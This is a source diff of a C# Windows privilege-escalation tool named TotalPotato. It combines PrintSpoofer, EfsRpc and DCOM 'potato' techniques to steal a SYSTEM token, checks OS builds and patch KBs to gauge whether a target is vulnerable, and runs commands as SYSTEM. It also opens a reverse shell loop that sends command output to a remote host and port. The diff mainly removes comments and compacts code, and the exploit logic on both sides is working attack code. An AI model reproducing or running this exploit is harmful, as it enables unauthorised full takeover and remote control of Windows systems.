@@ -1,5 +1,4 @@
-﻿using System.Diagnostics;
-using System.Management;
+﻿using System.Management;
 using System.Net.Sockets;
 using System.Runtime.InteropServices;
 using System.Security.Principal;
@@ -74,11 +73,9 @@ namespace TotalPotato
             public IntPtr hStdError;
         }
 
-        // Constants for handle flags
         private const uint HANDLE_FLAG_INHERIT = 0x00000001;
         private const uint HANDLE_FLAG_PROTECT_FROM_CLOSE = 0x00000002;
 
-        // Constants for CreateProcessAsUser
         private const uint CREATE_NO_WINDOW = 0x08000000;
         private const int STARTF_USESTDHANDLES = 0x00000100;
         private const uint INFINITE = 0xFFFFFFFF;
@@ -91,47 +88,24 @@ namespace TotalPotato
             int ProcessInformationLength
         );
 
-        // Process-related constants and functions
         [DllImport("kernel32.dll", SetLastError = true)]
         private static extern bool GetExitCodeProcess(IntPtr hProcess, out uint lpExitCode);
 
         [DllImport("kernel32.dll", SetLastError = true)]
         private static extern bool TerminateProcess(IntPtr hProcess, uint uExitCode);
 
-        // Additional CLSIDs that might work
-        private static readonly string[] AdditionalClsIds = new string[]
-        {
-            "00000000-0000-0000-C000-000000000046", // IUnknown
-            "00000306-0000-0000-C000-000000000046", // JuicyPotato
-            "8BC3F05E-D86B-11D0-A075-00C04FB68820", // PrintSpooferNet
-            "D99E6E73-FC88-11D0-B498-00A0C90312F3", // ShellServiceHost
-            "0289a7c5-91bf-4547-81ae-fec91a89dec5", // RoguePotato
-            "7AB36653-1796-484B-BDFA-E74F1DB7C1DC"  // IColorDataProxy
-        };
-
-        // Configurable timeouts
-        private int CommandTimeout = 30000;  // 30 seconds for commands
-        private int ShellTimeout = 300000;   // 5 minutes for shell connections
-        private int ConnectionTimeout = 10000; // 10 seconds for TCP connections
-
+ 
+        private int CommandTimeout = 30000; private int ShellTimeout = 300000; private int ConnectionTimeout = 10000;
         public bool IsApplicable()
         {
-            var osVersion = OSVersionHandler.GetOSVersion(); // Returns System.Version
-            int build = osVersion.Build;
+            var osVersion = OSVersionHandler.GetOSVersion(); int build = osVersion.Build;
             int major = osVersion.Major;
 
-            // SweetPotato generally works on Win7+ but fails on newer systems and patched builds
-            bool isWindows7OrLater = major >= 6; // Windows 7 is 6.1, Windows 10 is 10.0
-            bool isSupportedBuild = build <= 22000; // Windows 11 is build 22000+
-
-            // Known KBs that patch or break SweetPotato behavior (sample list)
+            bool isWindows7OrLater = major >= 6; bool isSupportedBuild = build <= 22000;
             string[] patchKBs = new string[]
-            {
-                "KB5004442", // DCOM hardening
-                "KB5018410", // Additional COM protections
-                "KB5021233", // Seen breaking various potato exploits
-                "KB5022282"
-            };
+{
+                "KB5004442",                 "KB5018410",                 "KB5021233",                 "KB5022282"
+};
 
             bool isPatched = false;
 
@@ -174,23 +148,29 @@ namespace TotalPotato
 
             return isWindows7OrLater && isSupportedBuild && !isPatched;
         }
+        public void VerbosePrint(string message, ConsoleColor color = ConsoleColor.White)
+        {
+            Console.ForegroundColor = color;
+            Console.WriteLine(message);
+            Console.ResetColor();
+        }
 
         public bool Execute(string command, string rev_host, int rev_port)
         {
-            // Main CLSIDs to try first
-            string[] primaryClsIds = new string[] {
-                "4991D34B-80A1-4291-83B6-3328366B9097", // BITS
-                "F087771F-D74F-4C1A-BB8A-E16ACA9124EA", // IMonikerActivator
-                "C49E32C6-BC8B-11D2-85D4-00105A1F8304"  // Windows Update
-            };
-
-            // Combine primary and additional CLSIDs
-            List<string> allClsIds = new List<string>(primaryClsIds);
-            allClsIds.AddRange(AdditionalClsIds);
+            string[] allClsIds = new string[] {
+                "4991D34B-80A1-4291-83B6-3328366B9097",                 
+                "F087771F-D74F-4C1A-BB8A-E16ACA9124EA",                 
+                "C49E32C6-BC8B-11D2-85D4-00105A1F8304",            
+                "00000000-0000-0000-C000-000000000046",             
+                "00000306-0000-0000-C000-000000000046",             
+                "8BC3F05E-D86B-11D0-A075-00C04FB68820",             
+                "D99E6E73-FC88-11D0-B498-00A0C90312F3",             
+                "0289a7c5-91bf-4547-81ae-fec91a89dec5",             
+                "7AB36653-1796-484B-BDFA-E74F1DB7C1DC"};
 
             ushort port = 6666;
             string program = @"c:\Windows\System32\cmd.exe";
-            PotatoAPI.Mode mode = PotatoAPI.Mode.PrintSpoofer;
+            PotatoAPI.Mode mode = PotatoAPI.Mode.EfsRpc;
             ExecutionMethod executionMethod = ExecutionMethod.Auto;
 
             try
@@ -220,28 +200,22 @@ namespace TotalPotato
                 bool exploitSuccess = false;
                 PotatoAPI potatoAPI = null;
 
-                // First try named pipe methods as they're often more reliable
                 if (TryNamedPipeExploits(out potatoAPI))
                 {
                     exploitSuccess = true;
                     Console.WriteLine("[+] Named pipe exploitation succeeded");
                 }
-                // If named pipe methods fail, try DCOM with various CLSIDs
                 else
                 {
                     Console.WriteLine("[*] Named pipe methods failed, trying DCOM with multiple CLSIDs");
-                    // Try each CLSID until one works
                     foreach (string clsId in allClsIds)
                     {
                         Console.WriteLine($"[+] Attempting DCOM NTLM interception with CLSID {clsId} on port {port}");
 
-                        // For DCOM mode, create a new PotatoAPI instance with the current CLSID
                         potatoAPI = new PotatoAPI(new Guid(clsId), port, PotatoAPI.Mode.DCOM);
 
-                        // Try to trigger the exploit
                         if (potatoAPI.Trigger())
                         {
-                            // Check if token was successfully obtained
                             if (potatoAPI.Token != IntPtr.Zero)
                             {
                                 Console.WriteLine($"[+] Successfully obtained token using CLSID: {clsId}");
@@ -258,15 +232,13 @@ namespace TotalPotato
                             Console.WriteLine($"[!] No authenticated interception took place with CLSID: {clsId}");
                         }
 
-                        // Slight delay before trying the next CLSID
                         Thread.Sleep(500);
                     }
                 }
 
-                // If none of the methods worked, exit
                 if (!exploitSuccess || potatoAPI == null || potatoAPI.Token == IntPtr.Zero)
                 {
-                    Console.WriteLine("[!] All exploitation methods failed. Exploit unsuccessful.");
+                    Console.WriteLine("[!] All modes have failed.");
                     return false;
                 }
 
@@ -281,21 +253,18 @@ namespace TotalPotato
                     return false;
                 }
 
-                // Use ManualResetEvent to signal when the thread is done
                 using (ManualResetEvent threadDone = new ManualResetEvent(false))
                 {
-                    // Create a class-level variable to store output
                     string resultOutput = string.Empty;
 
                     Thread systemThread = new Thread(() =>
                     {
                         try
                         {
-                            // Try using ImpersonateLoggedOnUser instead of SetThreadToken
                             if (!ImpersonateLoggedOnUser(potatoAPI.Token))
                             {
                                 int error = Marshal.GetLastWin32Error();
-                                Console.WriteLine($"[!] ImpersonateLoggedOnUser failed with error code: {error}");
+                                VerbosePrint($"[!] ImpersonateLoggedOnUser failed with error code: {error}");
                                 threadDone.Set();
                                 return;
                             }
@@ -303,7 +272,6 @@ namespace TotalPotato
                             WindowsIdentity identity = WindowsIdentity.GetCurrent(true);
                             Console.WriteLine($"[+] Current identity after impersonation: {identity.Name}");
 
-                            // For command execution with output capture
                             if (!string.IsNullOrEmpty(command))
                             {
                                 ExecuteCommandWithSystemToken(impersonatedPrimary, command, out resultOutput);
@@ -312,7 +280,6 @@ namespace TotalPotato
                                 Console.WriteLine(resultOutput);
                             }
 
-                            // If reverse host and port are provided, establish a TCP connection
                             if (!string.IsNullOrEmpty(rev_host) && rev_port > 0)
                             {
                                 try
@@ -331,7 +298,6 @@ namespace TotalPotato
                         }
                         finally
                         {
-                            // Revert to original token when done
                             try
                             {
                                 RevertToSelf();
@@ -341,16 +307,13 @@ namespace TotalPotato
                                 Console.WriteLine($"[!] Failed to revert impersonation: {ex.Message}");
                             }
 
-                            // Always signal that we're done, even if an exception occurred
                             threadDone.Set();
                         }
                     });
 
-                    // Start thread and wait for it to complete
                     systemThread.Start();
 
-                    // Wait for the thread to complete its work with a reasonable timeout
-                    if (!threadDone.WaitOne(ShellTimeout)) // 5 minute timeout
+                    if (!threadDone.WaitOne(ShellTimeout))
                     {
                         Console.WriteLine("[!] Thread execution timed out");
                     }
@@ -360,7 +323,6 @@ namespace TotalPotato
                     }
                 }
 
-                // Clean up
                 if (impersonatedPrimary != IntPtr.Zero)
                 {
                     CloseHandle(impersonatedPrimary);
@@ -370,7 +332,7 @@ namespace TotalPotato
             catch (Exception e)
             {
                 Console.WriteLine("[!] Failed to exploit COM: {0}", e.Message);
-                Console.WriteLine(e.StackTrace.ToString());
+                VerbosePrint(e.StackTrace.ToString());
                 return false;
             }
         }
@@ -382,7 +344,6 @@ namespace TotalPotato
 
             try
             {
-                // Try PrintSpoofer first
                 Console.WriteLine("[+] Attempting PrintSpoofer named pipe impersonation technique");
                 potatoAPI = new PotatoAPI(Guid.Empty, port, PotatoAPI.Mode.PrintSpoofer);
 
@@ -392,7 +353,6 @@ namespace TotalPotato
                     return true;
                 }
 
-                // Try EfsRpc next
                 Console.WriteLine("[+] PrintSpoofer failed, trying EfsRpc technique");
                 potatoAPI = new PotatoAPI(Guid.Empty, port, PotatoAPI.Mode.EfsRpc);
 
@@ -416,7 +376,6 @@ namespace TotalPotato
         {
             output = string.Empty;
 
-            // Create pipes for stdout and stderr
             IntPtr hStdOutRead = IntPtr.Zero;
             IntPtr hStdOutWrite = IntPtr.Zero;
             IntPtr hStdErrRead = IntPtr.Zero;
@@ -424,51 +383,43 @@ namespace TotalPotato
 
             try
             {
-                // Set up security attributes for pipe handles to be inherited
                 SECURITY_ATTRIBUTES saAttr = new SECURITY_ATTRIBUTES();
                 saAttr.nLength = Marshal.SizeOf(typeof(SECURITY_ATTRIBUTES));
                 saAttr.bInheritHandle = true;
                 saAttr.lpSecurityDescriptor = IntPtr.Zero;
 
-                // Create stdout pipe
                 if (!CreatePipe(out hStdOutRead, out hStdOutWrite, ref saAttr, 0))
                 {
                     Console.WriteLine($"[!] Failed to create stdout pipe: {Marshal.GetLastWin32Error()}");
                     return false;
                 }
 
-                // Set stdout handle as not inheritable
                 if (!SetHandleInformation(hStdOutRead, HANDLE_FLAG_INHERIT, 0))
                 {
                     Console.WriteLine($"[!] Failed to set stdout handle information: {Marshal.GetLastWin32Error()}");
                     return false;
                 }
 
-                // Create stderr pipe
                 if (!CreatePipe(out hStdErrRead, out hStdErrWrite, ref saAttr, 0))
                 {
                     Console.WriteLine($"[!] Failed to create stderr pipe: {Marshal.GetLastWin32Error()}");
                     return false;
                 }
 
-                // Set stderr handle as not inheritable
                 if (!SetHandleInformation(hStdErrRead, HANDLE_FLAG_INHERIT, 0))
                 {
                     Console.WriteLine($"[!] Failed to set stderr handle information: {Marshal.GetLastWin32Error()}");
                     return false;
                 }
 
-                // Set up startup info for the process
                 STARTUPINFO startupInfo = new STARTUPINFO();
                 startupInfo.cb = Marshal.SizeOf(typeof(STARTUPINFO));
                 startupInfo.dwFlags = STARTF_USESTDHANDLES;
                 startupInfo.hStdOutput = hStdOutWrite;
                 startupInfo.hStdError = hStdErrWrite;
 
-                // Set working directory to System32 to avoid UNC path issues
                 string workingDir = Environment.GetFolderPath(Environment.SpecialFolder.System);
 
-                // Create process with the token
                 PROCESS_INFORMATION processInfo = new PROCESS_INFORMATION();
                 string cmdLine = $"cmd.exe /c {command}";
 
@@ -491,30 +442,25 @@ namespace TotalPotato
                     return false;
                 }
 
-                // Close pipe write handles - this is important so ReadFile doesn't hang
                 CloseHandle(hStdOutWrite);
                 hStdOutWrite = IntPtr.Zero;
                 CloseHandle(hStdErrWrite);
                 hStdErrWrite = IntPtr.Zero;
 
-                // Read output from the process using an improved method
                 StringBuilder stdoutBuilder = ReadPipeToEnd(hStdOutRead);
                 StringBuilder stderrBuilder = ReadPipeToEnd(hStdErrRead);
 
-                // Wait for process to exit with a timeout
                 uint waitResult = WaitForSingleObject(processInfo.hProcess, (uint)CommandTimeout);
 
-                if (waitResult == 0x102) // WAIT_TIMEOUT
+                if (waitResult == 0x102)
                 {
                     Console.WriteLine("[!] Process execution timed out, terminating process");
                     TerminateProcess(processInfo.hProcess, 1);
                 }
 
-                // Get exit code
                 uint exitCode = 0;
                 GetExitCodeProcess(processInfo.hProcess, out exitCode);
 
-                // Combine output
                 output = stdoutBuilder.ToString();
                 string errorOutput = stderrBuilder.ToString();
 
@@ -523,13 +469,11 @@ namespace TotalPotato
                     output += "\nERROR: " + errorOutput;
                 }
 
-                // Add exit code if non-zero
                 if (exitCode != 0)
                 {
                     output += $"\n[Process exited with code: {exitCode}]";
                 }
 
-                // Clean up process handles
                 CloseHandle(processInfo.hProcess);
                 CloseHandle(processInfo.hThread);
 
@@ -543,7 +487,6 @@ namespace TotalPotato
             }
             finally
             {
-                // Clean up pipe handles
                 if (hStdOutRead != IntPtr.Zero) CloseHandle(hStdOutRead);
                 if (hStdOutWrite != IntPtr.Zero) CloseHandle(hStdOutWrite);
                 if (hStdErrRead != IntPtr.Zero) CloseHandle(hStdErrRead);
@@ -578,7 +521,6 @@ namespace TotalPotato
                 {
                     Console.WriteLine($"[+] Connecting to {host}:{port}");
 
-                    // Connect with timeout
                     var connectResult = client.BeginConnect(host, port, null, null);
                     bool connectionSuccess = connectResult.AsyncWaitHandle.WaitOne(ConnectionTimeout);
 
@@ -587,12 +529,10 @@ namespace TotalPotato
                         throw new TimeoutException("Connection attempt timed out");
                     }
 
-                    // Complete the connection
                     client.EndConnect(connectResult);
 
                     Console.WriteLine("[+] Connection established!");
 
-                    // Configure timeouts
                     client.ReceiveTimeout = ConnectionTimeout;
                     client.SendTimeout = ConnectionTimeout;
 
@@ -600,20 +540,16 @@ namespace TotalPotato
                     using (StreamReader reader = new StreamReader(stream))
                     using (StreamWriter writer = new StreamWriter(stream) { AutoFlush = true })
                     {
-                        // Get current identity information
                         WindowsIdentity identity = WindowsIdentity.GetCurrent(true);
 
-                        // Send initial connection info
                         writer.WriteLine($"[+] Elevated connection established from {Environment.MachineName} - {identity.Name}");
                         writer.WriteLine($"[+] OS Version: {Environment.OSVersion}");
                         writer.WriteLine($"[+] Using token handle: 0x{tokenHandle.ToInt64():X}");
 
-                        // Command execution loop
                         while (IsClientConnected(client))
                         {
                             try
                             {
-                                // Read command from the server
                                 string command = reader.ReadLine();
 
                                 if (string.IsNullOrEmpty(command))
@@ -622,7 +558,6 @@ namespace TotalPotato
                                 if (command.ToLower() == "exit")
                                     break;
 
-                                // Special command to verify token
                                 if (command.ToLower() == "whoami")
                                 {
                                     writer.WriteLine($"Current identity: {identity.Name}");
@@ -630,11 +565,9 @@ namespace TotalPotato
                                     continue;
                                 }
 
-                                // Execute command using the system token
                                 string cmdOutput;
                                 bool success = ExecuteCommandWithSystemToken(tokenHandle, command, out cmdOutput);
 
-                                // Send the result back
                                 if (success)
                                 {
                                     writer.WriteLine(cmdOutput);
@@ -643,9 +576,9 @@ namespace TotalPotato
                                 {
                                     writer.WriteLine($"[!] Failed to execute command");
                                 }
-                                writer.WriteLine("[END_OF_OUTPUT]"); // Marker for end of output
+                                writer.WriteLine("[END_OF_OUTPUT]");
                             }
-                            catch (IOException ex) // Handle network errors
+                            catch (IOException ex)
                             {
                                 if (!IsClientConnected(client))
                                 {
@@ -660,7 +593,7 @@ namespace TotalPotato
                                 }
                                 catch
                                 {
-                                    break; // Can't write, connection is definitely gone
+                                    break;
                                 }
                             }
                             catch (Exception ex)
@@ -672,7 +605,7 @@ namespace TotalPotato
                                 }
                                 catch
                                 {
-                                    break; // Connection is gone
+                                    break;
                                 }
                             }
                         }
@@ -693,13 +626,11 @@ namespace TotalPotato
                 if (client == null || !client.Connected)
                     return false;
 
-                // Check if the client is still connected using polling
                 if (client.Client.Poll(0, SelectMode.SelectRead))
                 {
                     byte[] buff = new byte[1];
                     if (client.Client.Receive(buff, SocketFlags.Peek) == 0)
                     {
-                        // Client disconnected
                         return false;
                     }
                 }
